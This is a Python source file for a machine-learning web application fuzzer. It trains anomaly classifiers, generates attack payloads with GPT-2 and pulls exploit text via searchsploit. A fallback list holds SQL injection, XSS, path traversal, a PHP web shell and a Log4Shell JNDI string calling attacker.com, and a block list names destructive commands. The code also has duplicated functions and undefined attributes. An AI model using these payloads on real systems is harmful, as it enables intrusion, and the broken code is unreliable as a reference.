import numpy as np
import pandas as pd
import joblib
import os
import time
import shutil
import sys
import logging
import subprocess
import json
import re
import requests
from bs4 import BeautifulSoup
from collections import Counter
from datetime import datetime
from typing import Tuple, Dict, Optional, Union, List
import sklearn

# Machine Learning Imports
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.model_selection import train_test_split, GridSearchCV
from sklearn.metrics import classification_report, confusion_matrix, make_scorer
from sklearn.preprocessing import StandardScaler, OneHotEncoder
from sklearn.compose import ColumnTransformer
from imblearn.over_sampling import SMOTE, RandomOverSampler

# Payload Generation Imports
import torch
from transformers import GPT2LMHeadModel, GPT2Tokenizer
import random


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('model_training.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class Config:
    """Configuration constants"""
    DATASET_PATH = os.path.normpath(r"C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\fuzzer_dataset.csv")
    MODEL_DIR = "model_versions"
    MIN_SAMPLES_PER_CLASS = 5
    PAYLOAD_GEN_MODEL = "payload_generator.pkl"
    MAX_PAYLOAD_LENGTH = 100
    TRAINING_EPOCHS = 3
    TEST_SIZE = 0.2
    RANDOM_STATE = 42
    EXPLOITDB_PAYLOAD_LIMIT = 20
    MIN_PAYLOADS = 3
    MAX_PAYLOADS = 7
    ML_PAYLOADS_FILE = "C:\\Users\\LOKESH\\Desktop\\Web Application Fuzzer\\WEBFUZZER\\\ml_payloads.txt"

class ExploitDBInterface:
    def __init__(self):
        self.searchsploit_path = "/usr/bin/searchsploit"
        self.exploitdb_url = "https://www.exploit-db.com/"
        
    def search_exploits(self, keywords: list, limit: int = 10) -> list:
        """Search ExploitDB using searchsploit command line tool"""
        try:
            result = subprocess.run(
                [self.searchsploit_path, "-j"] + keywords,
                capture_output=True,
                text=True
            )
            
            if result.returncode != 0:
                logger.error(f"Searchsploit failed: {result.stderr}")
                return []
                
            data = json.loads(result.stdout)
            exploits = data.get('RESULTS_EXPLOIT', [])
            return [self._clean_exploit(e) for e in exploits[:limit]]
            
        except Exception as e:
            logger.error(f"ExploitDB search error: {e}")
            return []
    
    def _clean_exploit(self, exploit: dict) -> dict:
        """Clean and standardize exploit data"""
        return {
            'id': exploit.get('EDB-ID'),
            'title': exploit.get('Title'),
            'type': exploit.get('Type'),
            'platform': exploit.get('Platform'),
            'date': exploit.get('Date'),
            'author': exploit.get('Author'),
            'path': exploit.get('Path')
        }
    
    def fetch_exploit_content(self, path: str) -> str:
        """Fetch the content of a specific exploit"""
        try:
            result = subprocess.run(
                [self.searchsploit_path, "-p", path],
                capture_output=True,
                text=True
            )
            return result.stdout if result.returncode == 0 else ""
        except Exception as e:
            logger.error(f"Failed to fetch exploit content: {e}")
            return ""

class PayloadGenerator:
    """Payload generator that learns patterns from the dataset"""
    def __init__(self):
        # Initialize tokenizer with proper settings for generation
        self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
        self.tokenizer.pad_token = self.tokenizer.eos_token
        self.tokenizer.padding_side = 'left'  # Critical for generation
        
        self.model = GPT2LMHeadModel.from_pretrained('gpt2')
        self.model.eval()
        
        # Payload safety configuration
        self.forbidden_commands = [
            'rm -rf', 'format c:', 'shutdown', 
            'delete from', 'drop table', 'shutdown',
            'halt', 'reboot', 'poweroff'
        ]
        
        # Will be populated from dataset analysis
        self.common_patterns = []
        self.ml_payloads = []
        
        # TF-IDF vectorizer for pattern analysis
        self.vectorizer = TfidfVectorizer(
            analyzer='char',
            ngram_range=(2, 4),
            max_features=50
        )

    def analyze_dataset(self, dataset: pd.DataFrame):
        """Analyze the dataset to learn payload patterns"""
        try:
            # Get successful payloads (malicious/suspicious)
            successful_payloads = dataset[
                dataset['label'].isin(['malicious', 'suspicious'])
            ]['payload'].tolist()
            
            if not successful_payloads:
                logger.warning("No successful payloads found in dataset")
                return
            
            # Analyze character-level patterns
            X = self.vectorizer.fit_transform(successful_payloads)
            feature_names = self.vectorizer.get_feature_names_out()
            
            # Get most common patterns
            self.common_patterns = [
                pattern for pattern in feature_names 
                if len(pattern) >= 2 and not pattern.isalnum()
            ]
            
            logger.info(f"Discovered {len(self.common_patterns)} common patterns")
            
        except Exception as e:
            logger.error(f"Dataset analysis failed: {e}")    

    def _generate_from_finetuned(self, context: str, num_samples: int = 5) -> list:
        """Generate actual payloads using fine-tuned model with proper attention"""
        try:
            # Determine payload type from context
            payload_type = next(
                (pt for pt in self.payload_templates.keys() if pt.lower() in context.lower()),
                'SQL injection'  # default
            )
            
            # Use seed payloads as examples
            seed_payloads = random.sample(self.payload_templates[payload_type], 
                                       min(3, len(self.payload_templates[payload_type])))
            
            # Generate variations
            with torch.no_grad():
                inputs = self.tokenizer(
                    seed_payloads,
                    return_tensors='pt',
                    padding=True,
                    truncation=True,
                    max_length=Config.MAX_PAYLOAD_LENGTH,
                    return_attention_mask=True
                )
                
                outputs = self.model.generate(
                    input_ids=inputs['input_ids'],
                    attention_mask=inputs['attention_mask'],
                    max_length=Config.MAX_PAYLOAD_LENGTH,
                    num_return_sequences=num_samples,
                    do_sample=True,
                    top_k=50,
                    top_p=0.95,
                    temperature=0.7,
                    pad_token_id=self.tokenizer.eos_token_id
                )
                
                # Decode and filter results
                generated = []
                for output in outputs:
                    text = self.tokenizer.decode(output, skip_special_tokens=True)
                    if any(kw in text.lower() for kw in ['script', 'select', '../', ';', '|', '`']):
                        generated.append(text.strip())
                
                # Ensure we return between 3-7 good payloads
                return list(set(generated))[:min(7, max(3, len(generated)))]
                
        except Exception as e:
            logger.error(f"Payload generation error: {e}")
            return random.sample(self.payload_templates.get(payload_type, self.safe_patterns), 
                               min(num_samples, 7))


    def generate_payloads(self, num_samples: int = 5) -> List[str]:
        """Generate payloads based on learned patterns"""
        try:
            if not self.common_patterns:
                logger.warning("No patterns learned - using fallback generation")
                return self._generate_fallback_payloads(num_samples)
            
            # Generate using learned patterns
            prompts = [
                f"Generate web security test payload using patterns like: {random.choice(self.common_patterns)}"
                for _ in range(min(Config.MAX_PAYLOADS, max(Config.MIN_PAYLOADS, num_samples)))
            ]
            
            inputs = self.tokenizer(
                prompts,
                return_tensors='pt',
                padding=True,
                truncation=True,
                max_length=30
            )
            
            with torch.no_grad():
                outputs = self.model.generate(
                    input_ids=inputs['input_ids'],
                    attention_mask=inputs['attention_mask'],
                    max_length=Config.MAX_PAYLOAD_LENGTH,
                    num_return_sequences=1,
                    do_sample=True,
                    top_k=50,
                    pad_token_id=self.tokenizer.eos_token_id
                )
                
                # Process and validate generated payloads
                generated = []
                for i, output in enumerate(outputs):
                    payload = self.tokenizer.decode(output, skip_special_tokens=True)
                    payload = payload.replace(prompts[i], "").strip()
                    
                    # Extract first line and clean special chars
                    payload = payload.split('\n')[0]
                    payload = re.sub(r'[^\x20-\x7E]', '', payload)
                    
                    if payload and self._validate_payload(payload):
                        generated.append(payload)
                
                return generated[:num_samples]
                
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
            return self._generate_fallback_payloads(num_samples)
        
    def _generate_fallback_payloads(self, num_samples: int) -> List[str]:
        """Fallback payload generation when no patterns are learned"""
        common_payloads = [
            "' OR 1=1 --",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "| ls -la",
            "<?php system($_GET['cmd']); ?>",
            "%0D%0ALocation:%20javascript:alert(1)",
            "${jndi:ldap://attacker.com/x}"
        ]
        return random.sample(common_payloads, min(num_samples, len(common_payloads)))

    def _generate_from_finetuned(self, context: str, num_samples: int = 5) -> list:
        """Generate actual payloads with proper attention handling"""
        try:
            payload_type = self._get_payload_type(context)
            seed_payloads = random.sample(self.payload_templates[payload_type], 
                                       min(3, len(self.payload_templates[payload_type])))
            
            # Prepare inputs with proper attention masks
            inputs = self.tokenizer(
                seed_payloads,
                return_tensors='pt',
                padding=True,
                truncation=True,
                max_length=Config.MAX_PAYLOAD_LENGTH,
                return_attention_mask=True
            )
            
            # Generate with proper attention handling
            with torch.no_grad():
                outputs = self.model.generate(
                    input_ids=inputs['input_ids'],
                    attention_mask=inputs['attention_mask'],
                    max_length=Config.MAX_PAYLOAD_LENGTH,
                    num_return_sequences=num_samples,
                    do_sample=True,
                    top_k=50,
                    top_p=0.95,
                    temperature=0.7,
                    pad_token_id=self.tokenizer.eos_token_id
                )
                
                # Decode and filter results
                generated = []
                for output in outputs:
                    text = self.tokenizer.decode(output, skip_special_tokens=True)
                    if any(kw in text.lower() for kw in ['script', 'select', '../', ';', '|', '`']):
                        generated.append(text.strip())
                
                # Return 3-7 payloads
                return list(set(generated))[:min(7, max(3, len(generated)))]
                
        except Exception as e:
            logger.error(f"Payload generation error: {e}")
            payload_type = self._get_payload_type(context)
            return random.sample(self.payload_templates[payload_type], 
                               min(num_samples, len(self.payload_templates[payload_type])))

    def _validate_payload(self, payload: str) -> bool:
        """Validate payload safety and format"""
        if not payload or len(payload) > Config.MAX_PAYLOAD_LENGTH:
            return False
            
        payload_lower = payload.lower()
        return not any(
            cmd in payload_lower 
            for cmd in self.forbidden_commands
        ) and any(c in payload for c in ["'", '"', "<", ">", "/", "\\", "|", "&", "%"])

    def fine_tune(self, payload_data: Dict[str, int]) -> bool:
        """Fine-tune the generator on successful payloads"""
        try:
            if not payload_data:
                logger.warning("No payload data provided for fine-tuning")
                return False

            self.model.train()
            optimizer = torch.optim.AdamW(self.model.parameters(), lr=5e-5)
            
            texts = list(payload_data.keys())
            inputs = self.tokenizer(
                texts, 
                return_tensors='pt', 
                padding=True, 
                truncation=True,
                max_length=Config.MAX_PAYLOAD_LENGTH
            )

            for epoch in range(Config.TRAINING_EPOCHS):
                outputs = self.model(
                    input_ids=inputs['input_ids'],
                    attention_mask=inputs['attention_mask'],
                    labels=inputs['input_ids']
                )
                loss = outputs.loss
                loss.backward()
                optimizer.step()
                optimizer.zero_grad()
                logger.info(f"Epoch {epoch+1}, Loss: {loss.item():.4f}")

            self.model.eval()
            joblib.dump(self, Config.PAYLOAD_GEN_MODEL)
            return True
            
        except Exception as e:
            logger.error(f"Fine-tuning error: {e}")
            return False
        finally:
            torch.cuda.empty_cache()

    def _get_payload_type(self, context: str) -> str:
        """Determine payload type from context"""
        context_lower = context.lower()
        if 'sql' in context_lower:
            return 'SQL injection'
        elif 'xss' in context_lower:
            return 'XSS attack'
        elif 'path' in context_lower or 'traversal' in context_lower:
            return 'path traversal'
        elif 'command' in context_lower:
            return 'command injection'
        return 'SQL injection'  # default

    def analyze_and_generate_payloads(self, dataset: pd.DataFrame) -> List[str]:
        """Analyze dataset and generate new payloads"""
        try:
            logger.info("Analyzing dataset for payload generation...")
            
            # 1. Extract patterns from successful payloads
            patterns = self._extract_patterns(dataset)
            
            # 2. Fetch relevant exploits from ExploitDB
            exploitdb_payloads = self._fetch_exploitdb_payloads(patterns)
            
            # 3. Generate new payloads using ML
            generated_payloads = self._generate_ml_payloads(patterns)
            
            # Combine and validate payloads
            all_payloads = list(set(exploitdb_payloads + generated_payloads))
            valid_payloads = [p for p in all_payloads if self._validate_payload(p)]
            
            # Save to file
            self._save_payloads(valid_payloads)
            
            return valid_payloads
        except Exception as e:
            logger.error(f"Payload analysis failed: {e}")
            return []

    def _extract_patterns(self, dataset: pd.DataFrame) -> Dict[str, float]:
        """Extract common patterns from successful payloads"""
        try:
            successful_payloads = dataset[dataset['label'].isin(['malicious', 'suspicious'])]['payload'].tolist()
            
            patterns = Counter()
            for payload in successful_payloads:
                if '<script>' in payload:
                    patterns['xss'] += 1
                if 'OR 1=1' in payload:
                    patterns['sql_injection'] += 1
                if '../' in payload:
                    patterns['path_traversal'] += 1
                if 'system(' in payload:
                    patterns['command_injection'] += 1
            
            total = sum(patterns.values())
            return {k: v/total for k, v in patterns.items()}
        except Exception as e:
            logger.error(f"Pattern extraction failed: {e}")
            return {}

    def _fetch_exploitdb_payloads(self, patterns: Dict[str, float]) -> List[str]:
        """Fetch relevant payloads from ExploitDB"""
        try:
            if not patterns:
                return []
                
            payloads = []
            top_patterns = sorted(patterns.items(), key=lambda x: x[1], reverse=True)[:2]
            
            for pattern, _ in top_patterns:
                exploits = self.exploitdb.search_exploits([pattern], Config.EXPLOITDB_PAYLOAD_LIMIT)
                
                for exploit in exploits:
                    content = self.exploitdb.fetch_exploit_content(exploit['path'])
                    if content:
                        payloads.append(content[:Config.MAX_PAYLOAD_LENGTH])
            
            return list(set(payloads))[:Config.EXPLOITDB_PAYLOAD_LIMIT]
        except Exception as e:
            logger.error(f"ExploitDB fetch failed: {e}")
            return []

    def _generate_ml_payloads(self, patterns: Dict[str, float], num_samples: int = 10) -> List[str]:
        """Generate new payloads using the fine-tuned model"""
        try:
            if not patterns:
                return []
                
            generated = []
            for pattern, confidence in patterns.items():
                if confidence > 0.3:
                    context = f"{pattern} vulnerability payload"
                    with torch.no_grad():
                        inputs = self.tokenizer.encode(context, return_tensors='pt')
                        outputs = self.model.generate(
                            inputs,
                            max_length=Config.MAX_PAYLOAD_LENGTH,
                            num_return_sequences=num_samples,
                            do_sample=True,
                            top_k=50,
                            top_p=0.95,
                            temperature=0.7
                        )
                        generated.extend([
                            self.tokenizer.decode(output, skip_special_tokens=True) 
                            for output in outputs
                        ])
            return generated
        except Exception as e:
            logger.error(f"ML payload generation failed: {e}")
            return []

    def _save_payloads(self, payloads: List[str]):
        """Save payloads to file, maintaining unique entries"""
        try:
            existing_payloads = set(self.ml_payloads)
            new_payloads = set(payloads) - existing_payloads
            
            if new_payloads:
                with open(Config.ML_PAYLOADS_FILE, 'a') as f:
                    for payload in new_payloads:
                        f.write(f"{payload}\n")
                logger.info(f"Saved {len(new_payloads)} new payloads to {Config.ML_PAYLOADS_FILE}")
                self.ml_payloads.extend(new_payloads)
        except Exception as e:
            logger.error(f"Failed to save payloads: {e}")

def load_dataset() -> Tuple[Optional[pd.DataFrame], Optional[dict]]:
    """Load and validate dataset with enhanced error handling"""
    try:
        if not os.path.exists(Config.DATASET_PATH):
            raise FileNotFoundError(f"Dataset file not found at {Config.DATASET_PATH}")

        dataset = pd.read_csv(Config.DATASET_PATH)
        if dataset.empty:
            raise ValueError("Dataset file is empty")

        # Validate dataset structure
        required_columns = {'response_code', 'body_word_count_changed', 
                          'alert_detected', 'error_detected', 'label'}
        if not required_columns.issubset(dataset.columns):
            missing = required_columns - set(dataset.columns)
            raise ValueError(f"Missing required columns: {missing}")

        if len(dataset) < 20:
            raise ValueError("Insufficient samples (need at least 20)")

        if len(dataset['label'].unique()) < 2:
            raise ValueError("Need at least 2 classes for training")

        payload_analysis = dataset['payload'].value_counts().to_dict()
        logger.info(f"Dataset loaded successfully. Shape: {dataset.shape}")
        logger.info(f"Class distribution:\n{dataset['label'].value_counts()}")
        
        return dataset, payload_analysis

    except Exception as e:
        logger.error(f"Error loading dataset: {e}")
        return None, None

def preprocess_data(dataset: pd.DataFrame) -> Tuple[np.ndarray, np.ndarray, ColumnTransformer]:
    """Enhanced preprocessing pipeline with feature engineering"""
    try:
        features = pd.DataFrame()
        # Basic features
        features['response_code'] = dataset['response_code']
        features['body_word_count_changed'] = dataset['body_word_count_changed'].astype(int)
        features['alert_detected'] = dataset['alert_detected'].astype(int)
        features['error_detected'] = dataset['error_detected'].astype(int)
        
        # Derived features
        features['is_error_code'] = (dataset['response_code'] >= 400).astype(int)
        features['is_server_error'] = (dataset['response_code'] >= 500).astype(int)
        features['is_client_error'] = ((dataset['response_code'] >= 400) & 
                                     (dataset['response_code'] < 500)).astype(int)
        features['alert_with_error'] = (dataset['alert_detected'] & 
                                      dataset['error_detected']).astype(int)
        
        # Label encoding
        y = dataset['label'].map({'safe': 0, 'suspicious': 1, 'malicious': 2}).values
        
        # Preprocessing pipeline
        numeric_features = ['response_code', 'body_word_count_changed']
        categorical_features = ['alert_detected', 'error_detected',
                              'is_error_code', 'is_server_error',
                              'is_client_error', 'alert_with_error']
        
        preprocessor = ColumnTransformer(
            transformers=[
                ('num', StandardScaler(), numeric_features),
                ('cat', OneHotEncoder(handle_unknown='ignore'), categorical_features)
            ])
        
        X = preprocessor.fit_transform(features)
        return X, y, preprocessor

    except Exception as e:
        logger.error(f"Preprocessing error: {e}")
        raise

def isolation_scorer(estimator, X, y_true=None):
    """Anomaly detection rate scorer (ignores y_true)."""
    preds = estimator.predict(X)
    return np.mean(preds == -1)  # Fraction of anomalies

# Wrap with make_scorer (critical for GridSearchCV)
iso_scorer = make_scorer(
    isolation_scorer, 
    needs_y=False  # Tell sklearn to skip y_true
)

def train_models(X: np.ndarray, y: np.ndarray, preprocessor: ColumnTransformer, 
                payload_data: Optional[dict] = None) -> Tuple[Optional[IsolationForest], 
                                                             Optional[RandomForestClassifier], 
                                                             Optional[PayloadGenerator]]:
    """Complete model training with enhanced error handling"""
    try:
        logger.info("Starting model training...")
        best_iso = None
        best_rf = None
        payload_gen = None
        # Initialize payload generator
        payload_gen = PayloadGenerator()
        if payload_data:
            logger.info("Fine-tuning payload generator...")
            if not payload_gen.fine_tune(payload_data):
                logger.warning("Payload generator fine-tuning failed")
        
        # Train-test split
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, 
            test_size=Config.TEST_SIZE, 
            random_state=Config.RANDOM_STATE, 
            stratify=y
        )
        
        # Handle class imbalance
        unique_classes, class_counts = np.unique(y_train, return_counts=True)
        logger.info(f"Class distribution before resampling: {dict(zip(unique_classes, class_counts))}")
        
        if len(unique_classes) < 2:
            logger.warning("Only one class present - skipping resampling")
            X_res, y_res = X_train, y_train
        elif min(class_counts) < Config.MIN_SAMPLES_PER_CLASS:
            logger.info(f"Using RandomOverSampler (min samples < {Config.MIN_SAMPLES_PER_CLASS})")
            ros = RandomOverSampler(random_state=Config.RANDOM_STATE)
            X_res, y_res = ros.fit_resample(X_train, y_train)
        else:
            logger.info("Using SMOTE for resampling")
            smote = SMOTE(k_neighbors=min(2, min(class_counts)-1), random_state=Config.RANDOM_STATE)
            X_res, y_res = smote.fit_resample(X_train, y_train)
        
        # Train Isolation Forest
        logger.info("Training Isolation Forest...")
        
        best_iso = IsolationForest(
            n_estimators=100, 
            contamination=0.1,  # Approximate expected anomaly rate
            random_state=Config.RANDOM_STATE
        )
        best_iso.fit(X_res)  # Unsupervised - no y_res needed
        
        # Manual evaluation
        iso_pred = best_iso.predict(X_test)
        anomaly_rate = np.mean(iso_pred == -1)
        logger.info(f"Anomaly detection rate: {anomaly_rate:.2f}")
                
        # Train Random Forest
        logger.info("Training Random Forest...")
        rf_params = {
            'n_estimators': [50, 100],
            'max_depth': [None, 5],
            'class_weight': ['balanced']
        }
        
        rf_clf = GridSearchCV(
            RandomForestClassifier(random_state=Config.RANDOM_STATE),
            param_grid=rf_params,
            scoring='accuracy',
            cv=min(5, max(2, len(np.unique(y_res))))
        )
        rf_clf.fit(X_res, y_res)
        best_rf = rf_clf.best_estimator_
        
        # Evaluation
        logger.info("\n=== Model Evaluation ===")
        if best_iso is not None:
            logger.info("\nIsolation Forest Results:")
            iso_pred = best_iso.predict(X_test)
            logger.info(f"Anomaly detection rate: {np.mean(iso_pred == -1):.2f}")
        else:
            logger.error("Isolation Forest model not available for evaluation")

        if best_rf is not None:    
            logger.info("\nRandom Forest Results:")
            present_classes = np.unique(y_test)
            class_names = ['safe', 'suspicious', 'malicious']
            target_names = [class_names[i] for i in present_classes]
            logger.info(classification_report(
                y_test, 
                best_rf.predict(X_test),
                target_names=target_names,
                zero_division=0
            ))
            
            logger.info("Confusion Matrix:")
            logger.info(confusion_matrix(y_test, best_rf.predict(X_test)))
        else:
            logger.error("Random Forest model is not available for evaluation")
        
        # Generate sample payloads
        sample_payloads = payload_gen.generate_payloads(num_samples=3)
        logger.info("\nGenerated sample payloads:")
        for i, payload in enumerate(sample_payloads, 1):
            logger.info(f"{i}. {payload}")
        
        return best_iso, best_rf, payload_gen

    except Exception as e:
        logger.error(f"Model training failed: {e}")
        return None, None, None

def save_models(iso_model: IsolationForest, 
               rf_model: RandomForestClassifier, 
               preprocessor: ColumnTransformer, 
               payload_gen: Optional[PayloadGenerator] = None) -> bool:
    """Enhanced model saving with versioning"""
    try:
        os.makedirs(Config.MODEL_DIR, exist_ok=True)
        timestamp = int(time.time())
        
        # Prepare metadata
        metadata = {
            'created': datetime.now().isoformat(),
            'python_version': sys.version,
            'dependencies': {
                'sklearn': sklearn.__version__,
                'torch': torch.__version__
            },
            'training_parameters': {
                'test_size': Config.TEST_SIZE,
                'random_state': Config.RANDOM_STATE
            }
        }
        
        # Save models with timestamp
        models_to_save = {
            'anomaly_model': iso_model,
            'classifier_model': rf_model,
            'preprocessor': preprocessor,
            'metadata': metadata
        }
        
        if payload_gen:
            models_to_save['payload_gen'] = payload_gen
        
        for name, model in models_to_save.items():
            filepath = os.path.join(Config.MODEL_DIR, f"{name}_{timestamp}.pkl")
            joblib.dump(model, filepath)
            
            # Create latest version copy
            latest_path = os.path.join(Config.MODEL_DIR, f"{name}.pkl")
            if os.path.exists(latest_path):
                os.remove(latest_path)
            shutil.copyfile(filepath, latest_path)
        
        logger.info(f"\nModels saved to {Config.MODEL_DIR}/ directory")
        return True
        
    except Exception as e:
        logger.error(f"Error saving models: {e}")
        return False

def main():
    """Main execution with comprehensive error handling"""
    try:
        logger.info("Starting model training process...")
        
        # Check GPU availability
        if torch.cuda.is_available():
            logger.info("GPU available for payload generation")
            device = torch.device("cuda")
        else:
            logger.info("Using CPU for payload generation")
            device = torch.device("cpu")
        
        # Load dataset
        dataset, payload_data = load_dataset()
        if dataset is None:
            logger.error("Failed to load dataset - exiting")
            return
        
        # Initialize payload generator and analyze dataset
        payload_gen = PayloadGenerator()
        new_payloads = payload_gen.analyze_and_generate_payloads(dataset)
        if new_payloads:
            logger.info(f"Generated {len(new_payloads)} new payloads based on dataset analysis")
        
        # Preprocess data
        try:
            X, y, preprocessor = preprocess_data(dataset)
        except Exception as e:
            logger.error(f"Data preprocessing failed: {e}")
            return
        
        # Train models
        iso_model, rf_model, payload_gen = train_models(X, y, preprocessor, payload_data)
        if iso_model is None or rf_model is None:
            logger.error("Model training failed - exiting")
            return
        
        # Save models
        if not save_models(iso_model, rf_model, preprocessor, payload_gen):
            logger.error("Failed to save models - exiting")
            return
        
        logger.info("\n=== Model training completed successfully ===")
        
        # Demonstrate payload generation
        if payload_gen:
            logger.info("\nPayload Generation Demo:")
            contexts = ["XSS attack", "SQL injection", "path traversal"]
            for context in contexts:
                logger.info(f"\nPayloads for '{context}':")
                payloads = payload_gen.generate_payloads(context, num_samples=2)
                for i, payload in enumerate(payloads, 1):
                    logger.info(f"{i}. {payload}")
    
    except KeyboardInterrupt:
        logger.info("\nProcess interrupted by user")
    except Exception as e:
        logger.error(f"\n!!! Critical error in main execution: {e}")
    finally:
        if 'payload_gen' in locals():
            del payload_gen  # Clean up GPU memory
        torch.cuda.empty_cache()

def main():
    """Updated main function with automated payload generation"""
    try:
        logger.info("Starting model training process...")
        
        # Load dataset
        dataset, payload_data = load_dataset()
        if dataset is None:
            logger.error("Failed to load dataset - exiting")
            return
        
        # Initialize and analyze dataset
        payload_gen = PayloadGenerator()
        payload_gen.analyze_dataset(dataset)
        
        # Generate initial payloads
        generated_payloads = payload_gen.generate_payloads()
        logger.info("\nGenerated payloads based on dataset patterns:")
        for i, payload in enumerate(generated_payloads, 1):
            logger.info(f"{i}. {payload}")
        
        # Preprocess data and train models
        X, y, preprocessor = preprocess_data(dataset)
        iso_model, rf_model, _ = train_models(X, y, preprocessor, payload_data)
        
        # Save models
        if not save_models(iso_model, rf_model, preprocessor, payload_gen):
            logger.error("Failed to save models - exiting")
            return
        
        logger.info("\n=== Model training completed successfully ===")
        
        # Demonstrate payload generation
        if payload_gen:
            logger.info("\nPayload Generation Demo:")
            for i in range(3):  # Generate 3 sets of payloads
                payloads = payload_gen.generate_payloads()
                logger.info(f"\nGenerated payloads set {i+1}:")
                for j, payload in enumerate(payloads, 1):
                    logger.info(f"{j}. {payload}")
    
    except Exception as e:
        logger.error(f"\nCritical error: {e}")
    finally:
        if 'payload_gen' in locals():
            del payload_gen
        torch.cuda.empty_cache()

if __name__ == "__main__":
    main()